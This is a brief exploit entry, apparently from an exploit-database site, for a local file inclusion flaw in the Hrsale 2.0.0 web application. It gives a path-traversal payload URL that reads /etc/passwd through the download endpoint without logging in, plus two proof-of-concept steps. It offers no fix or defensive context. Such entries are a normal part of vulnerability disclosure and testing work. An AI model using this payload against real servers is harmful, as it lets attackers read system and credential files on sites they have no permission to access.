---
title: "Hrsale 2.0.0 - Local File Inclusion"
date: 2020-10-22T10:57:56-03:00
draft: false
type: "lfi "
platform: "webapps"
---


```html
Description:
This exploit allow you to download any readable file from server with out permission and login session.

Payload :
           https://hrsale/download?type=files&filename=../../../../../../../../etc/passwd
POC:

  1.  Access to HRsale application and browse to download path with payload
  2.  Get /etc/passwd


```
